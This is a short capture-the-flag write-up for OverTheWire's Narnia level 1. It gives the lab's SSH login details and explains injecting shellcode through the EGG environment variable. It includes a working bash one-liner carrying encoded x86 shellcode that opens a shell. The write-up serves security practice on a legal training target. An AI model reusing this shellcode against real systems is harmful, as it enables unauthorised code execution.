# Narnia Level 1 -> Level 2


## Level Info
SSH: [narnia.labs.overthewire.org](narnia.labs.overthewire.org)
Port: 2226
Username: narnia1
Password: efeidiedae
Attack Type: Injecting Shellcode via. environment variables 


## Explanation
This level was a basic shellcode injection via environment variable. To be honest, we didn't need to do any actual exploitation as the code itself is exploitable by design.
We just need to properly select a shellcode and propery set it to the environment.
For me the main problem was setting the variable for **EGG**. As it happens,setting hex strings to environment variables cause the program to **SEGFAULT**. The proper way happens to be using some printing functionality like `printf`.

The exploit code and the shellcode is given below
```bash
EGG=$(printf "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81") ./narnia1
```

This will drop us into a bash shell. Use it to get the password of narnia2
